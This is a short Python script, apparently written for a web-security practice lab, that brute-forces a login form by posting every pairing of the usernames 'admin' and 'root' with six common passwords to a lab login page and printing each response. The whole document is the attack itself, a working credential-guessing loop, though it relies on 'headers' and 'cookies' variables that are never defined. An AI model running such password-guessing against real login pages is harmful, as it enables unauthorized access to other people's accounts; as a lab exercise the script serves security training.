import requests


username_list=["admin","root"]

password_list=["samsung","shadow","blink182","333333","michael1","babygirl1"]

for i in username_list:
    for j in password_list:
        data = {
            'username': i ,
            'password': j ,
        }
        response = requests.post('https://lab.feifei.tw/practice/basic/burp/login.php', headers=headers, cookies=cookies, data=data)
        print(response.text)

